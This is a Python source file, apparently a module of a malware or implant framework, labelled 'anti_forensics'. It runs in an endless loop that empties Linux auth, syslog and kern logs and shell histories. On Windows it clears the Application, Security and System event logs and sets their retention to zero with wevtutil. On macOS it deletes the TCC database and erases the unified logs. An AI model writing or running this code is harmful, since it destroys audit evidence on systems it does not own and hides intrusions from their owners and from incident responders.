import os
import subprocess
import threading
import time
import traceback
import sqlite3

from pathlib import Path
from modules.logger import log_event
from modules.config import load_config

cfg = load_config().get("anti_forensics", {})
LINUX_INTERVAL = cfg.get("linux_clear_interval", 3600)
WINDOWS_CLEAR = cfg.get("windows_clear_logs", True)
MACOS_CLEAR = cfg.get("macos_clear_tcc", True)

def clear_linux_logs():
    try:
        # Wipe common log directories
        logs = ["/var/log/auth.log", "/var/log/syslog", "/var/log/kern.log"]
        for log in logs:
            if os.path.exists(log):
                open(log, "w").close()
                os.utime(log, (time.time(), time.time()))
        # Clear shell histories
        home = Path.home()
        for hist in [home / ".bash_history", home / ".zsh_history"]:
            if hist.exists():
                open(hist, "w").close()
                os.utime(hist, (time.time(), time.time()))
        log_event("anti_forensics", b"Cleared Linux logs/histories.")
    except Exception as e:
        log_event("anti_forensics", f"Error clearing Linux logs: {e}".encode())

def clear_windows_logs():
    try:
        # Clear Application, Security, System event logs
        cmds = [
            ["wevtutil", "cl", "Application"],
            ["wevtutil", "cl", "Security"],
            ["wevtutil", "cl", "System"]
        ]
        for cmd in cmds:
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
        # Disable future logs by setting retention to 0
        subprocess.run(["wevtutil", "sl", "Application", "/ms:0"], timeout=15)
        subprocess.run(["wevtutil", "sl", "Security", "/ms:0"], timeout=15)
        subprocess.run(["wevtutil", "sl", "System", "/ms:0"], timeout=15)
        log_event("anti_forensics", b"Cleared and disabled Windows Event Logs.")
    except Exception as e:
        log_event("anti_forensics", f"Error clearing Windows logs: {e}".encode())

def clear_macos_tcc():
    try:
        # Remove TCC.db to wipe permissions history
        tcc_path = "/Library/Application Support/com.apple.TCC/Tcc.db"
        if os.path.exists(tcc_path):
            os.remove(tcc_path)
        # Erase unified logs (requires macOS 10.12+)
        subprocess.run(["log", "erase", "--all"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
        log_event("anti_forensics", b"Cleared macOS TCC and unified logs.")
    except Exception as e:
        log_event("anti_forensics", f"Error clearing macOS logs: {e}".encode())

def anti_forensics_loop():
    while True:
        try:
            if os.name == "nt" and WINDOWS_CLEAR:
                clear_windows_logs()
            elif sys.platform.startswith("linux"):
                clear_linux_logs()
            elif sys.platform == "darwin" and MACOS_CLEAR:
                clear_macos_tcc()
        except Exception as e:
            log_event("anti_forensics", f"Anti-forensics loop error: {e}".encode())
        time.sleep(LINUX_INTERVAL)
